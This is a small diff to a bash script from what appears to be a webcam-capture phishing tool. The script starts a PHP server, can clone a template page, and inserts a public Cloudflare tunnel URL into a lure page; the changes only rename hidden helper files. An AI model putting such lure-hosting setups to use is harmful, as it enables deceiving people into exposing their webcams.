@@ -210,7 +210,7 @@ printf "\e[1;92m[\e[0m+\e[1;92m] Starting php server...\n"
 php -S 0.0.0.0:8080 > /dev/null 2>&1 &
 if [[ $templateyn = "y" ]]; then
   .monolith/./monolith $templateurl -o .temp1.html
-  python3 .replace.py > index2.html
+  python3 replace.py > index2.html
 fi
 sed 's+forwarding_link+''+g' template.php > index.php
 sleep 2
@@ -235,7 +235,7 @@ cf=$(grep -o 'https://[-0-9a-z]*\.trycloudflare.com' .server/log.txt)
 printf '\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Url: '$cf'\e[0m\n'
 sed 's+forwarding_link+''+g' template.php > index.php
 
-sed 's+forwarding_link+'$cf'+g' saycheese.html > .frame.html
+sed 's+forwarding_link+'$cf'+g' saycheese.html > frame.html
 checkfound
 else
 printf "\e[1;93m [!] Invalid option!\e[0m\n"
